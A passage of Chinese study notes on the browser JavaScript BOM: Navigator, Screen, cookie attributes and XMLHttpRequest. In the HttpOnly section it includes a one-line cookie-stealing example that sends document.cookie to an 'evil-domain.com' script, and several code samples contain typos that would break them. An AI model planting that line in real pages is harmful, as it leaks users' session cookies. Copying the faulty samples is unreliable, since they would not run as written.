<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;online&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;online&#39;</span><span class="p">);</span> <span class="p">});</span>

<span class="nx">Navigator</span><span class="p">.</span><span class="nx">language</span><span class="err">，</span><span class="nx">Navigator</span><span class="p">.</span><span class="nx">languages</span> <span class="nx">表示用户的首选语言</span><span class="err">，</span><span class="nx">和可以接受的语言</span><span class="p">(</span><span class="nx">浏览器翻译界面使用</span><span class="p">)</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="nx">Navigator</span><span class="p">.</span><span class="nx">geolocation</span> <span class="nx">包含用户地理位置的信息</span><span class="err">。</span><span class="nx">注意</span><span class="err">，</span><span class="nx">该</span> <span class="nx">API</span> <span class="nx">只有在</span> <span class="nx">HTTPS</span> <span class="nx">协议下可用</span><span class="err">。</span>
<span class="nx">Geolocation</span> <span class="nx">对象提供下面三个方法</span><span class="err">。</span>
<span class="nx">Geolocation</span><span class="p">.</span><span class="nx">getCurrentPosition</span><span class="p">()</span><span class="err">：</span><span class="nx">得到用户的当前位置</span>
<span class="nx">Geolocation</span><span class="p">.</span><span class="nx">watchPosition</span><span class="p">()</span><span class="err">：</span><span class="nx">监听用户位置变化</span>
<span class="nx">Geolocation</span><span class="p">.</span><span class="nx">clearWatch</span><span class="p">()</span><span class="err">：</span><span class="nx">取消watchPosition</span><span class="p">()</span><span class="nx">方法指定的监听函数</span>
<span class="nx">注意</span><span class="err">，</span><span class="nx">调用这三个方法时</span><span class="err">，</span><span class="nx">浏览器会跳出一个对话框</span><span class="err">，</span><span class="nx">要求用户给予授权</span><span class="err">。</span>

<span class="nx">Navigator</span><span class="p">.</span><span class="nx">cookieEnabled</span> <span class="nx">这个属性反映的是浏览器总的特性</span>
</code></pre></div>

<p>下面是常见的方法</p>
<div class="codehilite"><pre><span></span><code><span class="nx">Navigator</span><span class="p">.</span><span class="nx">javaEnabled</span><span class="p">()</span> <span class="nx">返回一个布尔值</span><span class="err">，</span><span class="nx">表示浏览器是否能运行</span> <span class="nx">Java</span> <span class="nx">Applet</span> <span class="nx">小程序</span><span class="err">。</span>
<span class="nx">Navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">()</span> <span class="nx">用于向服务器异步发送数据</span>
</code></pre></div>

<h3 id="104-screen">10.4  Screen<a class="headerlink" href="#104-screen" title="Permanent link">&para;</a></h3>
<p>Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。<code>window.screen</code>属性指向这个对象。</p>
<ul>
<li><code>Screen.height</code>：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。</li>
<li><code>Screen.width</code>：浏览器窗口所在的屏幕的宽度（单位像素）。</li>
<li><code>Screen.availHeight</code>：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于<code>height</code>减去那些被系统组件的高度。</li>
<li><code>Screen.availWidth</code>：浏览器窗口可用的屏幕宽度（单位像素）。</li>
<li><code>Screen.pixelDepth</code>：整数，表示屏幕的色彩位数，比如<code>24</code>表示屏幕提供24位色彩。</li>
<li><code>Screen.colorDepth</code>：<code>Screen.pixelDepth</code>的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。</li>
<li><code>Screen.orientation</code>：返回一个对象，表示屏幕的方向。该对象的<code>type</code>属性是一个字符串，表示屏幕的具体方向，<code>landscape-primary</code>表示横放，<code>landscape-secondary</code>表示颠倒的横放，<code>portrait-primary</code>表示竖放，<code>portrait-secondary</code>。</li>
</ul>
<p>下面是<code>Screen.orientation</code>的例子。具体的内容参考：</p>
<p>https://www.cnblogs.com/ndos/p/8245164.html</p>
<p>https://www.cnblogs.com/crafts/articles/5750522.html</p>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">orientation</span>
<span class="c1">// { angle: 0, type: &quot;landscape-primary&quot;, onchange: null }</span>
</code></pre></div>

<p>下面的例子保证屏幕分辨率大于 1024 x 768。</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">width</span> <span class="o">&gt;=</span> <span class="mf">1024</span> <span class="o">&amp;&amp;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">height</span> <span class="o">&gt;=</span> <span class="mf">768</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// 分辨率不低于 1024x768</span>
<span class="p">}</span>
</code></pre></div>

<p>下面是根据屏幕的宽度，将用户导向不同网页的代码。</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">((</span><span class="nx">screen</span><span class="p">.</span><span class="nx">width</span> <span class="o">&lt;=</span> <span class="mf">800</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">screen</span><span class="p">.</span><span class="nx">height</span> <span class="o">&lt;=</span> <span class="mf">600</span><span class="p">))</span> <span class="p">{</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;small.html&#39;</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;wide.html&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h3 id="105-cookiea">10.5 Cookie:a:<a class="headerlink" href="#105-cookiea" title="Permanent link">&para;</a></h3>
<h4 id="_10">概述<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
<p>cookie 是服务器在浏览器存储的很小的文本信息，通常小于4KB， 浏览器发出请求时，会附带cookie。服务器可以判断两次的请求是否来源于一个浏览器，可以保存用户自定义设置（语言，侧栏宽度，风格），保存token。注意：cookie 很小，不适合保存大量数据，如果cookie很大影响性能（大量存储放在storage中）。cookie包括：</p>
<ul>
<li>Cookie 的名字</li>
<li>Cookie 的值（真正的数据写在这里面）</li>
<li>到期时间</li>
<li>所属域名（默认是当前域名）：如果是某个域名下的cookie，URL必须是这个域名才能携带这部分cookie</li>
<li>生效的路径（默认是当前网址）</li>
</ul>
<p>可以通过 window.navigator.cookieEnabled 判断浏览器是否支持cookie。</p>
<p>根据同源策略：两个网址只要域名和端口相同可以共享cookie(协议不同也可以)</p>
<h4 id="cookie-http">cookie 与 http<a class="headerlink" href="#cookie-http" title="Permanent link">&para;</a></h4>
<p>浏览器发出请求，服务器在响应头中可以设置cookie(可以设置多个cookie)    如果服务器端想改一个cookie，需要域名和路径完全相同才能改。</p>
<div class="codehilite"><pre><span></span><code>HTTP/1.0 <span class="m">200</span> OK
Content-type: text/html
Set-Cookie: <span class="nv">token</span><span class="o">=</span>sdfghjklertyuiop
Set-Cookie: <span class="nv">tasty_cookie</span><span class="o">=</span>strawberry
Set-Cookie: <span class="nv">key1</span><span class="o">=</span>value2<span class="p">;</span> <span class="nv">domain</span><span class="o">=</span>example.com<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/blog
</code></pre></div>

<p>浏览器发出请求时，就会携带cookie；服务器获取cookie后，不能判断cookie的过期时间和路径</p>
<div class="codehilite"><pre><span></span><code>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: <span class="nv">token</span><span class="o">=</span>sdfghjklertyuiop<span class="p">;</span> <span class="nv">yummy_cookie</span><span class="o">=</span>choco<span class="p">;</span> <span class="nv">tasty_cookie</span><span class="o">=</span>strawberry
</code></pre></div>

<h4 id="_11">属性<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
<p>Expires Expires 表示cookie的过期时间，浏览器根据本地时间确定cookie是否过期（本地时间可能不准确）；</p>
<p>Max-Age Max-age 表示从现在开始，cookie 存在的秒数（7天内登录）；如果不设置这两个属性，那么 cookie 就是 session（对话） cookie，就在本次对话结束后销毁。</p>
<div class="codehilite"><pre><span></span><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre></div>

<p>Domain 说明cookie的域名和路径，只有满足这个域名后，发送请求才添加cookie；</p>
<p>Path 只有URL中包括路径才添加cookie（前提是同源策略，域名和端口号一致）</p>
<p>Secure 只有协议是HTTPS才保存cookie，如果是http请求，浏览器会忽略这个cookie</p>
<p>HTTPOnly 只有http请求才能获取并发送当前的cookie，不能通过脚本获取cookie，避免恶意脚本跨站注入攻击。这里创建一个空图片，并把cookie发送到一个危险网站（用户名和密码）；如果设置了一个 Cookie 的<code>HttpOnly</code>属性，JS代码就不会读到该 Cookie。</p>
<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="k">new</span> <span class="nx">Image</span><span class="p">()).</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
</code></pre></div>

<p>document.cookie 获取当前的cookie（HttpOnly属性不设置时可以获取）获取的是cookie字符串，需要转化</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</code></pre></div>

<p>这个属性可写（可以通过脚本对当前网站添加Cookie）==写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值）==，这可以用<code>encodeURIComponent</code>方法达到。<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。如果添加多个属性，可以先转化成数组，改变数组，最后保存cookie的值（例如界面评论栏的宽度）；写入cookie 时可以同时写入相关属性（过期时间）</p>
<div class="codehilite"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s1">&#39;fontSize=14; &#39;</span>
  <span class="o">+</span> <span class="s1">&#39;expires=&#39;</span> <span class="o">+</span> <span class="nx">someDate</span><span class="p">.</span><span class="nx">toGMTString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;; &#39;</span>
  <span class="o">+</span> <span class="s1">&#39;path=/subdirectory; &#39;</span>
  <span class="o">+</span> <span class="s1">&#39;domain=*.example.com&#39;</span><span class="p">;</span>
</code></pre></div>

<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
<div class="codehilite"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s1">&#39;fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT&#39;</span><span class="p">;</span>
</code></pre></div>

<h3 id="106-xmlhttpequesta">10.6 XMLHttpequest:a:<a class="headerlink" href="#106-xmlhttpequesta" title="Permanent link">&para;</a></h3>
<h4 id="_12">概述<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
<p>Ajax: 异步JS和XML；脚本发起通信，就是ajax。</p>
<p>步骤：创建XMLHttpRequest实例对象，发送请求，服务器响应，获取数据更新界面。</p>
<p>现在ajax返回的数据不是XML格式，通常是JSON格式，但是ajax还保留。现在不仅仅是http协议，file ftp 协议也可以，发送的数据格式不限制。ajax只能向同源网址（协议域名端口相同）发送请求，如果跨域会报错。</p>
<p>下面是原生ajax发送get请求：</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mf">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mf">200</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span><span class="p">);</span>
      <span class="nx">cosnole</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">statusText</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">};</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">omerror</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">statusText</span><span class="p">);</span>
<span class="p">};</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;http://example.com/page.php&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="c1">// 第三个参数表示异步发送请求</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
<span class="c1">// get 请求不带参数</span>
</code></pre></div>

<p>上面的案例在 example.com 请求，可以获取下面的返回值。如果不是同源，会显示CORS阻止。</p>
<div class="codehilite"><pre><span></span><code>The page at &#39;https://wangdoc.com/javascript/bom/xmlhttprequest.html&#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint &#39;http://www.example.com/page.php&#39;. This request has been blocked; the content must be served over HTTPS.
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!doctype html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Example Domain<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;Content-type&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;text/html; charset=utf-8&quot;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1&quot;</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Example Domain<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>This domain is established to be used for illustrative examples in documents. You may use this
    domain in examples without prior coordination or asking for permission.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://www.iana.org/domains/example&quot;</span><span class="p">&gt;</span>More information...<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>

<h4 id="_13">实例属性<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="nx">表示请求的状态</span><span class="err">，</span><span class="mf">4</span><span class="nx">表示请求已经完成</span><span class="err">，</span><span class="nx">属性变化时</span><span class="err">，</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="nx">会捕获到这个事件</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">response</span> <span class="nx">服务器返回的数据</span><span class="err">，</span><span class="nx">如果请求状态是4</span><span class="err">，</span><span class="nx">就是全部返回的数据</span><span class="err">；</span><span class="nx">如果请求没有结束</span><span class="err">（</span><span class="mf">3</span><span class="err">），</span><span class="nx">这个参数就是返回的部分数据</span><span class="err">；</span><span class="nx">可以使任何的数据类型</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">responseType</span> <span class="nx">表示服务器返回的数据类型</span><span class="err">，</span><span class="nx">属性可写</span><span class="err">，</span><span class="nx">默认是text</span><span class="err">。</span><span class="nx">在open方法后</span><span class="err">，</span><span class="nx">send方法前可以改变这个参数</span><span class="err">，</span><span class="nx">参数可以取下面的值</span><span class="err">。</span>

<span class="s2">&quot;arraybuffer&quot;</span><span class="err">：</span><span class="nx">ArrayBuffer</span> <span class="nx">对象</span><span class="err">，</span><span class="nx">表示服务器返回二进制数组</span><span class="err">。（</span><span class="nx">使用数组的方式处理二进制数据</span><span class="err">，</span><span class="nx">例如图片</span><span class="err">）</span>
<span class="s2">&quot;blob&quot;</span><span class="err">：</span><span class="nx">Blob</span> <span class="nx">对象</span><span class="err">，</span><span class="nx">表示服务器返回二进制对象</span><span class="err">。</span><span class="nx">适合图片传递</span><span class="err">。</span>
<span class="s2">&quot;document&quot;</span><span class="err">：</span><span class="nx">Document</span> <span class="nx">对象</span><span class="err">，</span><span class="nx">表示服务器返回一个文档对象</span><span class="err">。</span><span class="nx">操作DOM时</span><span class="err">，</span><span class="nx">直接返回document可以加载到界面中</span><span class="err">（</span><span class="nx">需要打开CORS</span><span class="err">）</span>
<span class="s2">&quot;json&quot;</span><span class="err">：</span><span class="nx">JSON</span> <span class="nx">对象</span><span class="err">。</span>
<span class="s2">&quot;text&quot;</span><span class="err">：</span><span class="nx">字符串</span><span class="err">。</span><span class="nx">直接处理比较方便</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;path/iamge/test.png&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="s1">&#39;blob&#39;</span><span class="p">;</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readystate</span> <span class="o">===</span> <span class="mf">4</span> <span class="o">&amp;&amp;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mf">200</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">response</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">res</span><span class="p">],</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;image/png&#39;</span><span class="p">});</span>
    <span class="c1">// or let blob = xhr.response</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>

<span class="c1">// 二进制数组 arraybuffer 处理图片的请求</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;to/test.png&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="s1">&#39;arraybuffer&#39;</span><span class="p">;</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">uInt8Array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">,</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">binStr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span> <span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="kr">byte</span> <span class="o">=</span> <span class="nx">uInt8Array</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>下面实例属性是服务器返回值属性</p>
<div class="codehilite"><pre><span></span><code><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span> <span class="nx">服务器返回的字符串</span><span class="p">(</span><span class="nx">如果返回的不是txt文本</span><span class="err">，</span><span class="nx">这个属性是null</span><span class="p">)</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">responseXML</span> <span class="p">(</span><span class="nx">首先设置responseType</span> <span class="o">===</span> <span class="nb">document</span><span class="p">)</span> <span class="nx">这个属性是解析后的DOM树</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">responseURL</span> <span class="nx">获取服务器的网址</span><span class="err">：</span><span class="nx">通常和open中参数相同</span><span class="err">，</span><span class="nx">网页跳转后</span><span class="err">，</span><span class="nx">这个网址就是实际返回数据的网址</span><span class="err">。</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="nx">返回HTTP状态码</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">statusText</span> <span class="err">“</span><span class="nx">OK</span><span class="err">”</span><span class="nx">和</span><span class="err">“</span><span class="nx">Not</span> <span class="nx">Found</span><span class="err">”</span> <span class="nx">对应200和404</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">timeout</span> <span class="nx">设置毫秒数</span><span class="err">，</span><span class="nx">如果请求超时</span><span class="err">，</span><span class="nx">停止请求</span><span class="err">（</span><span class="nx">下面是例子</span><span class="err">）</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">ontimeout</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
<span class="p">};</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mf">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mf">200</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// 处理服务器返回的数据</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">statusText</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">};</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">timeout</span> <span class="o">=</span> <span class="mf">10</span> <span class="o">*</span> <span class="mf">1000</span><span class="p">;</span> <span class="c1">// 指定 10 秒钟超时</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</code></pre></div>

<p>下面是事件监听属性</p>
<div class="codehilite"><pre><span></span><code><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">onloadstart</span><span class="err">：</span><span class="nx">loadstart</span> <span class="nx">事件</span><span class="err">（</span><span class="nx">HTTP</span> <span class="nx">请求发出</span><span class="err">）</span><span class="nx">的监听函数</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">onprogress</span><span class="err">：</span><span class="nx">progress事件</span><span class="err">（</span><span class="nx">正在发送和加载数据</span><span class="err">）</span><span class="nx">的监听函数</span>
<span class="nx">这个事件对象具有三个属性</span><span class="err">：</span><span class="nx">loaded</span> <span class="nx">total</span> <span class="nx">lengthComputable</span><span class="p">(</span><span class="nx">布尔值</span><span class="err">，</span><span class="nx">表示加载的进度是否可以计算</span><span class="p">)</span><span class="nx">这里可以使用</span> <span class="nx">loaded</span><span class="o">/</span><span class="nx">total</span> <span class="nx">获取已加载的百分比</span>

<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">onabort</span><span class="err">：</span><span class="nx">abort</span> <span class="nx">事件</span><span class="err">（</span><span class="nx">请求中止</span><span class="err">，</span><span class="nx">比如用户调用了abort</span><span class="p">()</span><span class="nx">方法</span><span class="err">）</span><span class="nx">的监听函数</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">onerror</span><span class="err">：</span><span class="nx">error</span> <span class="nx">事件</span><span class="err">（</span><span class="nx">请求失败</span><span class="err">）</span><span class="nx">的监听函数</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">onload</span><span class="err">：</span><span class="nx">load</span> <span class="nx">事件</span><span class="err">（</span><span class="nx">请求成功完成</span><span class="err">）</span><span class="nx">的监听函数</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">ontimeout</span><span class="err">：</span><span class="nx">timeout</span> <span class="nx">事件</span><span class="err">（</span><span class="nx">用户指定的时限超过了</span><span class="err">，</span><span class="nx">请求还未完成</span><span class="err">）</span><span class="nx">的监听函数</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">onloadend</span><span class="err">：</span><span class="nx">loadend</span> <span class="nx">事件</span><span class="err">（</span><span class="nx">请求完成</span><span class="err">，</span><span class="nx">不管成功或失败</span><span class="err">）</span><span class="nx">的监听函数</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="nx">表示跨域请求时</span><span class="err">，</span><span class="nx">用户信息</span><span class="err">（</span><span class="nx">cookie</span><span class="err">）</span><span class="nx">是否包含在请求头中</span><span class="err">（</span><span class="nx">默认是false</span><span class="err">）</span><span class="nx">如果是同域请求</span><span class="err">，</span><span class="nx">不需要设置这个属性</span>
<span class="nx">浏览器设置</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="nx">服务器会返回</span> <span class="nx">Access</span><span class="o">-</span><span class="nx">Control</span><span class="o">-</span><span class="nx">Allow</span><span class="o">-</span><span class="nx">Credentials</span><span class="o">:</span> <span class="kc">true</span> 
</code></pre></div>

<p>上传文件时，可以获取上传的进度，使用 upload 获取上传的进度</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">process</span> <span class="na">min</span><span class="o">=</span><span class="s">&quot;0&quot;</span> <span class="na">max</span><span class="o">=</span><span class="s">&quot;100&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;0&quot;</span><span class="p">&gt;</span>0%<span class="p">&lt;/</span><span class="nt">process</span><span class="p">&gt;</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">upload</span><span class="p">(</span><span class="nx">blobOrFile</span><span class="p">)</span> <span class="p">{</span>
